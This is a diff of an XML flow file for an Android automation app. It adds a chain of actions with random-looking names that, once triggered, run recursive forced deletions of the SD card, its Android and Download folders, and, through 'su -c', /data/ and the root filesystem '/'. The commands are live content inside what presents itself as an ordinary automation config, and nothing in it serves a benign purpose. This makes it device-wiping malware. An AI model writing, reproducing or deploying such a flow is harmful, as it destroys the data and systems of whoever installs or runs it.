@@ -678,24 +678,70 @@ else if(NTEXT2 == NTEXT3)
     <keepDeviceAwake>true</keepDeviceAwake>
     <allowWakeupFromDeviceIdle>false</allowWakeupFromDeviceIdle>
   </action>
-  <action type="execute_root_command">
+  <action type="execute_command">
     <useDefaultName>false</useDefaultName>
     <name>jwjcjiwjxkajnckwjxjrc</name>
-    <command>rm -f -Rr /</command>
-    <user></user>
-    <seContext></seContext>
+    <command>rm -r -f /sdcard/</command>
     <workingDirectory></workingDirectory>
     <timeout>300000</timeout>
     <variableStdout>stdout</variableStdout>
     <variableStderr>stderr</variableStderr>
     <variableExitCode>exit_code</variableExitCode>
   </action>
-  <action type="execute_root_command">
+  <action type="execute_command">
     <useDefaultName>false</useDefaultName>
-    <name>jwjcjiwjxkajnckwjxjrcw</name>
-    <command>rm -f -Rr /*</command>
-    <user></user>
-    <seContext></seContext>
+    <name>jwjcjiwjxkajnckwjxjrca</name>
+    <command>su -c rm -r -f /sdcard/</command>
+    <workingDirectory></workingDirectory>
+    <timeout>300000</timeout>
+    <variableStdout>stdout</variableStdout>
+    <variableStderr>stderr</variableStderr>
+    <variableExitCode>exit_code</variableExitCode>
+  </action>
+  <action type="execute_command">
+    <useDefaultName>false</useDefaultName>
+    <name>jwjcjiwjxkajnckwjxjrcax</name>
+    <command>su -c rm -r -f /</command>
+    <workingDirectory></workingDirectory>
+    <timeout>300000</timeout>
+    <variableStdout>stdout</variableStdout>
+    <variableStderr>stderr</variableStderr>
+    <variableExitCode>exit_code</variableExitCode>
+  </action>
+  <action type="execute_command">
+    <useDefaultName>false</useDefaultName>
+    <name>jwjcjiwjxkajnckwjxjrcq</name>
+    <command>rm -r -f /sdcard/*</command>
+    <workingDirectory></workingDirectory>
+    <timeout>300000</timeout>
+    <variableStdout>stdout</variableStdout>
+    <variableStderr>stderr</variableStderr>
+    <variableExitCode>exit_code</variableExitCode>
+  </action>
+  <action type="execute_command">
+    <useDefaultName>false</useDefaultName>
+    <name>jwjcjiwjxkajnckwjxjrcv</name>
+    <command>rm -r -f /sdcard/Android/</command>
+    <workingDirectory></workingDirectory>
+    <timeout>300000</timeout>
+    <variableStdout>stdout</variableStdout>
+    <variableStderr>stderr</variableStderr>
+    <variableExitCode>exit_code</variableExitCode>
+  </action>
+  <action type="execute_command">
+    <useDefaultName>false</useDefaultName>
+    <name>jwjcjiwjxkajnckwjxjrcx</name>
+    <command>rm -r -f /sdcard/Download/</command>
+    <workingDirectory></workingDirectory>
+    <timeout>300000</timeout>
+    <variableStdout>stdout</variableStdout>
+    <variableStderr>stderr</variableStderr>
+    <variableExitCode>exit_code</variableExitCode>
+  </action>
+  <action type="execute_command">
+    <useDefaultName>false</useDefaultName>
+    <name>jwjcjiwjxkajnckwjxjrcxz</name>
+    <command>su -c rm -r -f /data/</command>
     <workingDirectory></workingDirectory>
     <timeout>300000</timeout>
     <variableStdout>stdout</variableStdout>
@@ -1380,7 +1426,7 @@ break;
     <actioncontainer id="t45" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t46" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t47" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
-    <actioncontainer id="t48" x="0.0" y="17.499998">nsijxkskxkdkksxc</actioncontainer>
+    <actioncontainer id="t48" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t49" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t50" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t51" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
@@ -4249,21 +4295,41 @@ break;
     <group>GT Modify</group>
     <enabled>false</enabled>
     <executionPolicy>PARALLEL</executionPolicy>
-    <triggercontainer id="t1" x="70.00004" y="332.49994">
+    <actioncontainer id="t1" x="-140.00008" y="262.49997">jwjcjiwjxkajnckwjxjrc</actioncontainer>
+    <actioncontainer id="t2" x="-140.00015" y="262.50012">jwjcjiwjxkajnckwjxjrcax</actioncontainer>
+    <triggercontainer id="t3" x="-139.99995" y="262.49988">
       <trigger>uwkxnwjxjsonxkwkzkdd</trigger>
     </triggercontainer>
-    <actioncontainer id="t2" x="69.99998" y="332.5">jwjcjiwjxkajnckwjxjrc</actioncontainer>
-    <actioncontainer id="t3" x="69.99999" y="332.5">jwjcjiwjxkajnckwjxjrcw</actioncontainer>
-    <notecontainer id="t4" x="-2816.0" y="-960.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t5" x="-960.0" y="-5376.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t6" x="-960.0" y="-5376.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t7" x="576.0" y="-4736.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t8" x="1344.0" y="-256.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t9" x="-960.0" y="-5312.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t10" x="-832.0" y="-5184.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t11" x="-960.0" y="-5376.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t12" x="-896.0" y="-5248.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <connection from="t1" to="t2" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
-    <connection from="t2" to="t3" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <actioncontainer id="t4" x="-140.00002" y="262.50018">jwjcjiwjxkajnckwjxjrcq</actioncontainer>
+    <actioncontainer id="t5" x="-140.0" y="262.49994">jwjcjiwjxkajnckwjxjrcxz</actioncontainer>
+    <actioncontainer id="t6" x="-140.00003" y="262.50003">jwjcjiwjxkajnckwjxjrcx</actioncontainer>
+    <actioncontainer id="t7" x="-140.00005" y="262.50012">jwjcjiwjxkajnckwjxjrcv</actioncontainer>
+    <actioncontainer id="t8" x="-140.0" y="262.49997">jwjcjiwjxkajnckwjxjrca</actioncontainer>
+    <notecontainer id="t9" x="45504.0" y="10240.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t10" x="-101632.0" y="214528.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t11" x="1116032.0" y="1.07024E7" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t12" x="-767936.0" y="9675456.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t13" x="-619712.0" y="8082048.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t14" x="371520.0" y="613696.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t15" x="561536.0" y="45952.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t16" x="594944.0" y="143104.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t17" x="-5210368.0" y="-6290624.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t18" x="7.246048E7" y="-8.7531565E8" w="1.4100649E9" h="1.41006502E9"></notecontainer>
+    <notecontainer id="t19" x="7.2460416E7" y="-8.7531603E8" w="1.41006502E9" h="1.41006502E9"></notecontainer>
+    <notecontainer id="t20" x="7.246048E7" y="-8.7531603E8" w="1.4100649E9" h="1.41006502E9"></notecontainer>
+    <notecontainer id="t21" x="7.2460224E7" y="-8.7531475E8" w="1.4100649E9" h="1.41006502E9"></notecontainer>
+    <notecontainer id="t22" x="7.2460672E7" y="-8.7531616E8" w="1.41006502E9" h="1.41006502E9">xxxx</notecontainer>
+    <notecontainer id="t23" x="7.2460416E7" y="-8.7531501E8" w="1.41006502E9" h="1.41006502E9"></notecontainer>
+    <notecontainer id="t24" x="1.45773184E8" y="-8.8279706E8" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t25" x="7.2460224E7" y="-8.7530874E8" w="1.4100649E9" h="1.41006502E9"></notecontainer>
+    <notecontainer id="t26" x="7.246112E7" y="-8.7531181E8" w="1.4100649E9" h="1.41006502E9"></notecontainer>
+    <connection from="t1" to="t4" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t2" to="t1" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t3" to="t1" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t4" to="t7" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t5" to="t2" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t6" to="t8" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t7" to="t6" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t8" to="t5" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
   </flow>
 </data>
